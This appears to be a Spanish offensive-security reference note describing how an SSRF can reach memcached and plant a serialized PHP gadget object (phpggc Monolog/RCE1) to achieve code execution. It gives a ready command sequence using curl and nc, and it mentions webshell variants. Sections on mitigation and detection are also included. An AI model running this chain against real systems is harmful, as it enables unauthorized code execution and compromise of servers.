---
topic: Memcached — inyección de objetos PHP por SSRF
tags: [linux, memcached, ssrf, php-deserialization, rce]
---

# Memcached — inyección de objetos PHP por SSRF

[🌐 English](memcached-php-injection.en.md) | **Español**

## Concepto

Memcached acepta comandos de texto sin autenticación. Si una aplicación escribe en caché datos que luego deserializa y un SSRF permite alcanzar memcached, el atacante puede inyectar una clave con un objeto PHP serializado. Al leerla, la aplicación lo deserializa y ejecuta gadgets.

## Cuándo aplica

- Memcached escucha en localhost o en una red interna.
- La aplicación usa memcached para sesiones o caché.
- Existe un SSRF que permite elegir host y puerto.

## Procedimiento

1. Confirmar el SSRF y el acceso a memcached.
2. Construir el objeto PHP con `phpggc`.
3. Escribir la clave con `set` mediante el SSRF.
4. Provocar la lectura y la deserialización.

## Comandos

```bash
curl -s "http://<HOST>/fetch?url=http://127.0.0.1:11211/"
phpggc -b Monolog/RCE1 system id > payload.bin
printf 'set cache_key 0 0 %d\r\n' $(wc -c < payload.bin) | cat - payload.bin | nc 127.0.0.1 11211
curl -s "http://<HOST>/read?key=cache_key"
```

## Variantes

- Envenenar una sesión PHP almacenada en memcached.
- Usar `add` o `replace` para no romper la clave.
- Combinar con un objeto que escriba un webshell.

## Limitaciones

- La aplicación debe deserializar el valor.
- El SSRF debe permitir el protocolo y el puerto.
- Memcached puede estar protegido por red.

## Mitigación

- No deserializar datos de caché.
- Restringir memcached a localhost y autenticación.
- Validar el destino del SSRF.

## Detección

- Comandos `set` desde HTTP.
- Objetos PHP serializados en memcached.
- SSRF hacia el puerto `11211`.

## Referencias

- [Memcached — Protocol](https://github.com/memcached/memcached/blob/master/doc/protocol.txt)
- [0xdf — Travel](https://0xdf.gitlab.io/2020/09/12/htb-travel.html)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
